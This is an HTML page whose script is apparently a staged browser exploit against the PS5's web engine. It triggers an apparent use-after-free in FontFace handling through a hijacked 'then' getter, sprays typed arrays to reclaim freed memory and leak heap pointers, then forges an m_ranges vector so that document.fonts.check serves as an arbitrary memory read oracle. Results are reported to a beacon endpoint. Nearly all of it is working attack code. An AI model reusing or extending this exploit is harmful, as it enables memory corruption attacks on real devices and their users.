<!DOCTYPE html>
<html lang="en"><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
<title>PS5 Recon</title>
<style>
:root{--bg:#070a0f;--panel:#111722;--line:#1e2838;--txt:#cfe0f2;--dim:#6b7c94;--green:#39d98a;--red:#ff5d6c;--amber:#ffcf6b;--cyan:#53d0e8;--mag:#ff6fd0}
*{margin:0;padding:0;box-sizing:border-box}
html,body{background:var(--bg);color:var(--txt);font:13px/1.5 ui-monospace,Menlo,Consolas,monospace}
#bn{position:fixed;top:0;left:0;right:0;z-index:99;font:800 17px/1.3 ui-monospace,monospace;padding:15px 12px;text-align:center;color:#fff;background:#1b2330;border-bottom:3px solid #2a3647}
#sub{position:fixed;top:68px;left:0;right:0;z-index:98;font:600 11px ui-monospace,monospace;padding:6px 12px;text-align:center;color:var(--dim);background:#0d131c;border-bottom:1px solid var(--line)}
#log{margin:100px 10px 10px;padding:10px;background:var(--panel);border:1px solid var(--line);border-radius:8px;max-height:74vh;overflow:auto}
.r{padding:2px 5px;white-space:pre-wrap;word-break:break-all;border-left:3px solid transparent}
.r .t{color:var(--cyan);font-weight:700}.r .n{color:var(--dim);font-weight:700}
.r.ok{border-left-color:var(--green);background:#0c1f16}.r.ok .t{color:var(--green)}
.r.bad{border-left-color:var(--red);background:#1c0f12}.r.bad .t{color:var(--red)}
.r.warn .t{color:var(--amber)}
.r.win{border-left-color:var(--mag);background:#1e0f1b}.r.win .t{color:var(--mag);font-weight:800}
</style></head>
<body>
<div id="bn">starting…</div>
<div id="sub">P1314 — m_ranges READ oracle (forge Vector@0x20 → check() reads arbitrary memory)</div>
<div id="log"></div>
<script>
'use strict';
window.PTAG='P1314';
var LOG=document.getElementById('log'),BN=document.getElementById('bn');
var _ctr=0;
function S(x,c){BN.textContent=x;BN.style.background=c||'#1b2330';}
function cls(s){var z=(''+s).toLowerCase();
  if(/win|oracle-ok|read-ok|matchable|discrim/.test(z))return 'win';
  if(/hit|ok\b|live|true/.test(z))return 'ok';
  if(/err|fail|crash|fatal|miss|nospray|timeout|cap|nodiscrim|not-match/.test(z))return 'bad';
  if(/stale|none|retry/.test(z))return 'warn';return '';}
function row(t,d,c){_ctr++;var r=document.createElement('div');r.className='r '+(c||'');
  r.innerHTML="<span class='n'>"+_ctr+"</span>  <span class='t'>"+String(t).replace(/[<>&]/g,'')+"</span>"+(d?"  <span>"+String(d).replace(/[<>&]/g,'')+"</span>":"");
  LOG.appendChild(r);LOG.scrollTop=LOG.scrollHeight;}
function B(tag,data){
  var c=cls(tag+' '+(data||''));row(tag,data,c);
  try{var s=String(data||'').replace(/[^A-Za-z0-9._-]/g,'_').slice(0,700);
    var u='/beacon.php?tag=P1314-'+encodeURIComponent(tag);
    if(data)u+='&data='+encodeURIComponent(s);
    u+='&t='+Date.now();
    var x=new XMLHttpRequest();x.open('GET',u,false);x.send(null);}catch(e){}
}
window.onerror=function(m,s,l){B('ERR',(''+m).slice(0,80)+'@'+l);};

(function(){var id='';var cs='ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';for(var i=0;i<6;i++)id+=cs[Math.floor(Math.random()*cs.length)];B('VER-1','');B('BOOT',id);})();

function le(u,o){var x=0n;for(var q=7;q>=0;q--)x=(x<<8n)|BigInt(u[o+q]);return x;}
function grab(u,o){var a=[];for(var i=0;i<8;i++)a.push(u[o+i]);return a;}
function hexq(a){if(!a)return 'null';var s='0x';for(var i=7;i>=0;i--)s+=('0'+a[i].toString(16)).slice(-2);return s;}
function wq(buf,off,v){for(var i=0;i<8;i++){buf[off+i]=Number(v&0xFFn);v>>=8n;}}
function wd(buf,off,v){for(var i=0;i<4;i++){buf[off+i]=(v>>>(8*i))&0xFF;}}

var leaked={L1:null,L2:null,buf:null};

var RC=0;try{RC=parseInt(sessionStorage.getItem('p1314_rc')||'0',10)||0;}catch(e){}
function reloadOnce(){
  if(leaked.buf)return;
  if(RC>=3){B('NOLEAK-CAP','3 misses this open — CLOSE+REOPEN for fresh memory');S('no leak x3 — close+reopen the browser','#4a2a12');return;}
  try{sessionStorage.setItem('p1314_rc',String(RC+1));}catch(e){}
  setTimeout(function(){location.reload();},400);
}

/* ═══ STAGE 1 — proven K=32 marker leak → reclaimed CSSFontFace buffer + L1/L2 ═══ */
var K=32,SIZE=192,fired=false;
S('STAGE 1 — proven leak (press OK on memory popups)…','#13233a');
window.__sp=[];
var fs=null;
try{
  var vf=new FontFace('vf','local(Helvetica)',{unicodeRange:'U+0041'});
  document.fonts.add(vf); void vf.loaded;
  fs=document.createElement('style');
  fs.textContent='@font-face{font-family:v1;src:local(Arial);unicode-range:U+0042;}';
  document.head.appendChild(fs);
}catch(e){B('S1-SETUP-ERR',(''+e).slice(0,50));}
Object.defineProperty(FontFace.prototype,'then',{configurable:true,
  get:function(){
    if(fired)return undefined;fired=true;
    try{if(fs){fs.textContent='';fs.remove();}}catch(e){}
    try{document.fonts.delete(this);}catch(e){}
    fs=null;
    try{document.body.offsetHeight;}catch(e){}
    for(var k=0;k<K;k++){
      var w=new Uint8Array(new ArrayBuffer(SIZE));
      w[0x82]=3;w[0]=0;w[1]=0;w[2]=0;w[3]=0x80;
      var mj=0x1000+k;w[4]=mj&0xFF;w[5]=(mj>>8)&0xFF;w[6]=0;w[7]=0;
      window.__sp.push(w);
    }
    return undefined;
  },set:function(){}});
B('S1-SETUP','K=32 marked spray armed');
try{
  document.fonts.load('1em vf, v1','AB').then(
    function(f){B('S1-RES','n'+(f&&f.length));setTimeout(leScan,80);},
    function(e){B('S1-RJ',''+(e&&e.name));setTimeout(leScan,80);});
}catch(e){B('S1-LOADERR',(''+e).slice(0,40));}
setTimeout(function(){ if(leaked.buf)return; if(!window.__sp||!window.__sp.length){B('S1-NOSPRAY','getter never fired');reloadOnce();} },1500);
setTimeout(function(){ if(!leaked.buf){leScan();} },700);

function leScan(){
  if(leaked.buf)return;
  var sp=window.__sp||[],hit=-1;
  for(var i=0;i<sp.length;i++){
    var a=le(sp[i],0x58);
    if(a>0x1000000000n&&a<0x8000000000n){leaked.L1=a;leaked.L2=le(sp[i],0x68);leaked.buf=sp[i];hit=i;break;}
  }
  if(hit<0){B('S1-MISS','no reclaim');reloadOnce();return;}
  B('S1-HIT','L1=0x'+leaked.L1.toString(16)+' L2=0x'+leaked.L2.toString(16)+' k'+hit);
  S('LEAK OK — running m_ranges oracle…','#0c7a3a');
  setTimeout(oracle,150);
}

/* ═══ STAGE 2 — m_ranges READ oracle ═══
   m_ranges @ 0x20 : buffer@0x20, cap@0x28 (bit31=isBorrowed), size@0x2C
   rangesMatchCodePoint: empty⇒true ; else true iff some from<=cp<=to
   check(font,text) returns FALSE iff a MATCHED face (family-selectable) is Loading AND covers cp.
   Plan:
     A) size=0 (empty) + status=Loading ⇒ face covers ALL ⇒ check(fam,'A') should be FALSE (proves matchable+loading)
     B) size=1, buffer=high addr (from>0x10FFFF) ⇒ covers NO codepoint ⇒ check(fam,'A') should be TRUE
     A==FALSE && B==TRUE  ⇒ engine READS our forged m_ranges  ⇒ ORACLE CONFIRMED
     C) sweep buffer over L1/L2 offsets + codepoints to actually read small dwords from memory
*/
function chk(fam,cp){try{return document.fonts.check('16px '+fam,String.fromCodePoint(cp))?'T':'F';}catch(e){return 'E';}}
function oracle(){
  if(window.__o)return;window.__o=true;
  S('STAGE 2 — m_ranges oracle','#13233a');
  var buf=leaked.buf;
  /* baseline (default ranges, default status) */
  B('ORA-BASE','v1/A='+chk('v1',0x41)+' vf/A='+chk('vf',0x41)+' Nope/A='+chk('ZzQ9',0x41));

  buf[0x82]=1; /* m_status = Loading */

  var fams=['v1','vf'];
  var matchable=null;
  for(var fi=0;fi<fams.length;fi++){
    var fam=fams[fi];
    /* A: empty ranges ⇒ covers all */
    wd(buf,0x28,0x80000000); /* cap=0, borrowed */
    wd(buf,0x2C,0);          /* size=0 */
    var rA=chk(fam,0x41);
    /* B: one range at a HIGH address (from>0x10FFFF ⇒ no codepoint covered) */
    wq(buf,0x20,leaked.L1);  /* buffer = L1 (heap ptr, low dword ~ millions > 0x10FFFF) */
    wd(buf,0x28,0x80000001); /* cap=1, borrowed */
    wd(buf,0x2C,1);          /* size=1 */
    var rB=chk(fam,0x41);
    B('ORA-AB-'+fam,'empty='+rA+' highRange='+rB);
    if(rA==='F'&&rB==='T'){ B('ORACLE-OK','fam='+fam+' — engine READS our m_ranges AND face is matchable!'); matchable=fam; }
    else if(rA==='F'&&rB==='F'){ B('ORA-PARTIAL-'+fam,'matchable+loading but buffer/size maybe not honored (both F)'); if(!matchable)matchable=fam; }
  }

  if(!matchable){ B('ORA-NOT-MATCH','neither family selects our face (check unaffected) — reclaim orphaned'); S('face not matchable — tell AI (need diff reclaim)','#4a2a12'); finish(); return; }

  /* C: read small dwords from memory via codepoint sweep (values <= 0x10FFFF resolvable) */
  S('ORACLE WORKS — reading memory…','#0a7a2a');
  var fam=matchable;
  var cps=[0x1,0x20,0x41,0x100,0x800,0x2000,0x8000,0x40000,0x100000];
  var targets=[['L1',leaked.L1],['L1+8',leaked.L1+8n],['L1+0x10',leaked.L1+0x10n],['L2',leaked.L2],['L2+8',leaked.L2+8n]];
  for(var ti=0;ti<targets.length;ti++){
    wq(buf,0x20,targets[ti][1]);
    wd(buf,0x28,0x80000001); wd(buf,0x2C,1);
    var pat='';
    for(var ci=0;ci<cps.length;ci++){ pat+=chk(fam,cps[ci]); }
    var allSame=true;for(var z=1;z<pat.length;z++)if(pat[z]!==pat[0])allSame=false;
    B('ORA-RD-'+targets[ti][0], pat+(allSame?'':' <<DISCRIM — reading mem!'));
    if(!allSame)B('READ-OK','target='+targets[ti][0]+' codepoint-pattern='+pat+' (F=in-range) — arbitrary mem read via m_ranges!');
  }
  finish();
}
function finish(){
  if(window.__fin)return;window.__fin=true;
  B('DONE','p1314');
  S('P1314 COMPLETE — press the run button, I\'ll aggregate','#1b2330');
}
</script>
</body></html>
